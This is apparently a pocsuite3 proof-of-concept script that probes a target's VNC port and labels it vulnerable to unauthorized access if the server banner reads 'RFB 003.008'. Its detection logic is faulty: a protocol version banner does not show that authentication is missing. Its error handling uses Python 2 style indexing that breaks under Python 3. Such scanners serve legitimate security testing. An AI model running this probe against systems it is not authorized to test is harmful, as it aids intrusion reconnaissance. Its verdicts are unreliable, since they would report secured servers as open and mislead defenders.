#!/usr/bin/env python
#coding=utf-8

import traceback
import socket

# 将输入的url转换为ip:port，供socket使用
from pocsuite3.lib.utils import url2ip

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


'''
基于socket的未授权访问参考：https://github.com/knownsec/pocsuite3/blob/0f68c1cef3804c5d43be6cfd11c2298f3d77f0ad/pocsuite3/pocs/redis_unauthorized_access.py
'''
class VNC_POC(POCBase):
    vulID = 'VNC-unauthorized-access'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    appName = 'VNC'
    appVersion = ''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE

    vulDate = '2020-04-14'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-14'  # 编写 PoC 的日期
    updateDate = '2020-04-14'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mntn0x.github.io/2019/08/02/RealVNC%E6%BC%8F%E6%B4%9E/']  # 漏洞地址来源,0day不用写
    name = 'VNC未授权访问漏洞'  # PoC 名称
    cvss = u"高危"

    
    def _verify(self):
        result={}

        vul_url = self.url
        target_url = vul_url

        # 传入True参数，得到host和port，参考：https://github.com/knownsec/pocsuite3/blob/0f68c1cef3804c5d43be6cfd11c2298f3d77f0ad/pocsuite3/lib/utils/__init__.py
        host, port = url2ip(target_url, True)  

        socket.setdefaulttimeout(5)   # 默认timeout时间
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            server.connect((host, port))

            hello = server.recv(12)

            print("[*] Hello From Server: {0}".format(hello))

            # 如果响应内容中有"RFB 003.008"，则认为存在漏洞
            if "RFB 003.008" in str(hello):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                return self.save_output(result)
    
            return self.save_output(result)
        except socket.error as msg:
            print('[*] Could not connect to the target VNC service. Error code: ' + str(msg[0]) + ' , Error message : ' + msg[1])
            traceback.print_stack(msg)


    #漏洞攻击
    def _attack(self):
        return self._verify()


    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(VNC_POC)